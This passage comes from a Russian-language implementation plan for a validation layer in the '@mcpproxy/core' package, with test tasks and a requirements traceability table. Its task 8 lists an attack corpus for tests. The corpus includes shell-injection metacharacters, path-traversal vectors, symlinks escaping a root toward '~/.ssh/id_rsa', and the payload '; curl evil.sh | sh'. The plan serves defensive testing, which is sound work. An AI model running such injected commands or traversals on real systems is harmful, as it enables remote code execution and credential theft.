   без `null`, и `null` здесь заставил бы E4 делать ровно то преобразование, ради избежания
   которого форма `argv` устроена именно так. Плюс §5 этого плана уже записала правило
   «необязательное поле — отсутствующий ключ», и применять его к `argv`, но не к `cwd`,
   непоследовательно.
7. Третьего аргумента нет: `manifestDir` доехал до `prepared` на подготовке. Форма совпадает
   с R2, и тест R5 задачи 9 остаётся осмысленным — каталог, определяющий `cwd` и границы
   confinement, в сигнатуре отсутствует.
8. Событий здесь не создаётся (R23, D3).

**Falsification:** `timings` не включает отказавшую стадию → при отказе на `validate` массив
пуст, и E4 нечем заполнить `durationUs` обязательного ядра события; включает → длина 1 и
`timings[0].stage === 'validate'`. Утверждается имя стадии, а не длина.

На R31 — сквозная, через весь фасад, потому что шов между argv и хэшом ломается именно на
проводке, а не внутри стадии: файл создаётся под NFD-именем, запрашивается относительным
путём. Утверждается всё три сразу — `result.argv.at(-1)` равен `realpathSync` запрошенного
файла байт в байт; `argsHash(prepared.recipeName, result.params)` не бросает; и он же
совпадает с хэшом вызова, запросившего тот же файл абсолютным путём. Любая нормализация,
вставленная где-нибудь в цепочке, роняет первое утверждение.

На шаг 6: отказ на `resolve_paths` несёт ключ `cwd`, отказ на `validate` его **не имеет** —
утверждается `'cwd' in result`, а не сравнение значения с `null`: сравнение зелено и при
`cwd: undefined`, которое как раз и запрещено.

Отдельно, уровня типа: ветка `ok: false` не имеет поля `argv` — выражение перестаёт
компилироваться при его появлении, формой, названной в задаче 2 (см. «типовые трейсы» в задаче 2).

**Runtime:** node. `process.hrtime.bigint` монотонен и не зависит от NTP; тест утверждает
`durationUs >= 0` и целочисленность, а не конкретную величину — иначе он флакает на нагрузке.
Бюджет ≤50 мс p95 здесь **не проверяется**: оверхед определён относительно прямого вызова
того же скрипта, а скрипта на этой стадии ещё нет. Замер — E8/E9.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: фасад трёх стадий — все отказы, cwd со стадии резолва, params наружу`

---

### Задача 8 — корпус атак, сценарии S3 и S4, перепись кодов

Реализует R32, R33, R24 (двусторонняя перепись).

**Files:**
- Create: `packages/core/src/validate/corpus.test.ts`

**Шаги:**

1. Корпус A1 таблицей: `;`, `&&`, `$()`, обратные кавычки, перевод строки, омоглиф, нулевой
   байт, одиночный суррогат. Каждый вектор — против `run_tests.pattern` (`^[\w./-]{0,64}$`),
   утверждается отказ на стадии `validate`, ожидаемый **код**, и что `argv` в результате
   отсутствует.
2. Корпус A2: `../`, абсолютный путь, URL-кодирование, двойное кодирование — против
   `analyze_logs.file` с `root: ./logs`. **Цель обхода создаётся фикстурой**, иначе тест не
   отличает «мы не декодируем `%2e`» от «файла нет», и зелен даже при полностью отсутствующем
   confinement.
3. Корпус A3: симлинк на файл наружу и симлинк на каталог, через который идёт обход. Цели
   существуют.
3а. Вектор на `path-unusable`: значение `path`-параметра с нулевым байтом. `realpath` даёт
   `ERR_INVALID_ARG_VALUE`, а не `ENOENT` (Ф10), то есть это третья ветка шага 4 задачи 5.
   Назван здесь явно, потому что двусторонняя перепись шага 6 иначе покраснеет на коде без
   вектора — и правильно сделает, но пусть вектор будет написан, а не выужен из красного теста.
4. Сценарий S3: значение `'; curl evil.sh | sh'` останавливается на `validate`, причина
   называет паттерн и **не** содержит значения.
5. Сценарий S4 — **два вектора с разными фикстурами**, потому что два его утверждения требуют
   противоположных условий и одним вектором проверены быть не могут:

   - **S4-а, схлопывание кода (R15а).** Лексический обход, цель которого **не существует**.
     Утверждается `path-escapes-root`, а не `path-not-found`. Только этот случай и проверяет
     предпроверку: при существующей цели код одинаков с ней и без неё, и тест был бы зелен на
     сломанном механизме.
   - **S4-б, показ резолвнутого пути (R26).** Симлинк внутри `root`, указывающий **наружу**, на
     **созданную** фикстурой цель. Резолв удаётся, граница нарушается, причина несёт результат
     `realpath`. Именно это видит зал: куда вызов на самом деле указывал.

   Оба останавливаются на `resolve_paths` и ни один не доходит до `build_argv`. Разделение
   существенно: `docs/08-demo-scenarios.md:95` обещает показ резолвнутого пути для обоих
   вызовов демонстрации, а после введения предпроверки резолвнутого пути у несуществующей цели
   нет. На демо это не расходится — там `~/.ssh/id_rsa` у докладчика существует, — но тест
   обязан фиксировать механизм, а не удачу окружения.
6. **Двусторонняя перепись кодов отказа.** Таблица «код ↔ вектор, который его производит»
   живёт здесь, а не в задаче 2: там ситуаций ещё не существует, и перепись была бы
   односторонней — код, переставший производиться, не уронил бы ничего. Тест сверяет множество
   ключей таблицы с `DENIAL_CODES` **в обе стороны**, по образцу
   `packages/contracts/src/validate/refine.test.ts:538` и по тому же доводу, по которому
   `CHECK_IDS` объявлен массивом, а не только юнионом
   (`packages/contracts/src/validate/branch-checks.ts:10`).

Табличная форма — типизированный массив кортежей и `for … of` внутри одного `it` с меткой
вторым аргументом `expect`, по образцу
`packages/contracts/src/validate/lock.test.ts:86`: так падение называет строку.

**Falsification:** для каждого вектора трейс одинаков по форме — правило отсутствует →
`validateCall` возвращает `ok: true` и `argv` содержит вектор отдельным элементом; правило
есть → `ok: false` с ожидаемой парой «стадия, код». Утверждается пара, а не только `ok`:
отказ на не той стадии или с не тем кодом означает, что вектор поймало не то правило, — и
именно так URL-кодированный `%2e%2e%2f` мог бы «пройти» тест, упав по `path-not-found`.

**Runtime:** node, настоящая файловая система для A2 и A3, `mkdtempSync`.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: корпус A1-A3, сценарии S3 и S4, двусторонняя перепись кодов`

---

### Задача 9 — barrel и исполняемые границы пакета

Реализует R1, R3 (исполняемая часть), R5, R35.

**Files:**
- Modify: `packages/core/src/index.ts`
- Create: `packages/core/src/deps.test.ts`

**Шаги:**

1. `packages/core/src/index.ts`: заменить `export {};` на реэкспорт публичной формы E2 —
   `prepareRecipe`, `validateCall`, типы результатов, `DenialCode`, `DENIAL_CODES`.
   Комментарий-карта пакета (`E1 policy · E2 validate · E3 exec · E6 audit`) сохраняется.
2. `deps.test.ts` строится на **белом списке**, а не на чёрном (R1): множество достижимых
   голых специфаеров обязано быть подмножеством `{'@mcpproxy/contracts', 'node:path',
   'node:fs'}`. Чёрный список здесь не работает — `walk` в
   `packages/contracts/src/deps.test.ts:32` записывает голый специфаер и внутрь пакета **не
   заходит**, поэтому правдоподобный регресс `import … from '@mcpproxy/contracts/validate'`
   не попал бы ни под одно запрещённое имя, а `ajv`, `yaml` и `re2` оказались бы в рантайме.
   Белый список закрывает и это, и `electron`, и любую будущую зависимость одним утверждением.
3. Проверяются **обе** половины графа — `dist/index.js` и `dist/index.d.ts`. Тип, протёкший в
   декларацию, ломает потребителя так же, как импорт в рантайме; контракты проверяют обе
   (`packages/contracts/src/deps.test.ts:82`).
4. Позитивный контроль по образцу `packages/contracts/src/deps.test.ts:79`: утверждение, что
   обход **действительно что-то видит** — граф достигает больше одного файла и содержит
   `@mcpproxy/contracts`. Без него тест зелен на пустом `dist`, и это ровно тот дефект,
   который в E0 уже чинили.
5. Сорс-скан по `packages/core/src/validate/**`: `new RegExp` и конструктор `RegExp` не
   встречаются. Это исполняемая часть R3 — блоклист импортов его не ловит, потому что
   `RegExp` глобал, а не импорт. Литеральные регулярки (зачистка суррогатов) разрешены и
   перечислены явно.
6. Тест на R5 уровня типа: `validateCall` не имеет параметра, которым можно передать argv,
   бинарь, `cwd` или профиль.

**Falsification:** белого списка нет → добавление `import { parseManifest } from
'@mcpproxy/contracts/validate'` в любой модуль `core` проходит молча, и `re2` оказывается в
графе; белый список есть → тест краснеет, называя специфаер. Проверяется временной мутацией.

Позитивный контроль фальсифицируется отдельно: при пустом `dist` граф достигает 0 файлов, и
утверждение краснеет — без него тест был бы зелёным на пустоте
(`packages/contracts/src/deps.test.ts:66`).

Сорс-скан: добавление `new RegExp('x')` в `params.ts` роняет тест; без скана — не роняет
ничего, и R3 держится только на дисциплине.

**Runtime:** node. Тест читает `dist`, поэтому `test` пакета начинается с `tsc -b` (задача 1).

**Verify:** `yarn workspace @mcpproxy/core test && yarn typecheck && yarn build && yarn test`

**Commit:** `E2: barrel пакета core и исполняемые границы — белый список, сорс-скан`

---

## Перед отправкой на ревью — диff требований

| `Rn` | Строка плана, которая его реализует |
|---|---|
| R1 | Задача 9, шаги 2–4 — белый список, обе половины графа, позитивный контроль |
| R2 | Задача 3 (`prepareRecipe`) + задача 7; двухаргументная сигнатура — задача 7, шаг 7 |
| R3 | Задача 3, шаг 2 (ключ через `matcherKey`) + шаг 4 (сырого `pattern` в форме нет) + задача 9, шаг 5 (сорс-скан) |
| R4 | Задача 3, шаги 3 и 5 |
| R5 | Задача 9, шаг 6 |
| R6 | Задача 4, шаг 2 |
| R7 | Задача 4, шаг 3; отсутствие элементов argv — задача 6, шаг 3 |
| R8 | Задача 4, шаг 5 — диспетчеризация, где гейт типа принадлежит функции типа |
| R9 | Задача 4, шаг 6 |
| R10 | Задача 4, шаг 7 |
| R11 | Задача 4, шаг 8 |
| R12 | Задача 4, шаг 9 |
| R13 | Задача 5, шаги 4–5 |
| R14 | Задача 5, шаг 2 — realpath корня первым |
| R15 | Задача 5, шаг 5, предикат §7 |
| R15а | Задача 5, шаги 3–4 — предпроверка советующая: выбирает код, не отвергает |
| R16 | Задача 5, шаг 4 — `ENOENT` → `path-not-found` |
| R17 | Задача 5, шаг 7 — одна карта, нормализации нет нигде; сквозной трейс — задача 7 |
| R18 | Задача 3, шаг 8 (единственный вычислитель) + задача 5, шаг 8 (здесь не считается) + задача 7, шаг 6 (форма без `null`) |
| R19 | Задача 6, шаг 2 + фальсификация через `zebra`/`alpha` |
| R20 | Задача 6, шаг 5 (значение отдельным элементом) + задача 3, шаг 9 (не более одного слота на элемент) |
| R20а | Задача 6, шаг 7 — подстановка не интерпретирует подставляемое |
| R21 | Задача 6, шаг 4 |
| R22 | Задача 3, шаг 9 (слот в `exec`/`cwd`, `root: '/'`, относительный root, счёт слотов) + задача 6, шаг 1. Третий член требования — профиль песочницы — **вакуумен**: `PreparedRecipe` не несёт поля `sandbox` вовсе, поэтому подставить в профиль нечего и неоткуда; это записано, а не оставлено указывать в пустоту |
| R23 | Задача 7, шаги 1 и 8 |
| R24 | Задача 2, шаг 4; двусторонняя перепись — задача 8, шаг 6 |
| R25 | Задача 4, шаг 12 + фальсификация на `ZZmarkerZZ` |
| R26 | Задача 5, шаги 9 и 10 — какая строка едет в какой отказ |
| R27 | Задача 2, шаги 6–7 — две зачистки, оба поля |
| R28 | Задача 2, шаг 8 (предикат) + три источника: задача 4 шаги 4/6/7/10 (значения), задача 5 шаг 6 (выход realpath), задача 3 шаг 9а (строки рецепта, имена параметров, `recipeName`) |
| R29 | Задача 4, шаг 1 — гейт формы контейнера |
| R30 | Задача 2, шаг 11 (константа) + задача 4, шаги 6, 7 и 10 (применение во всех трёх строковых типах) |
| R30а | Задача 2, шаг 10 (константа) + задача 4, шаг 2а (применение) |
| R31 | Задача 7, шаг 4 |
| R32 | Задача 8, шаги 1–3 |
| R33 | Задача 8, шаги 4–5 |
| R34 | Задача 1 целиком |
| R35 | Задача 9, шаг 1 |
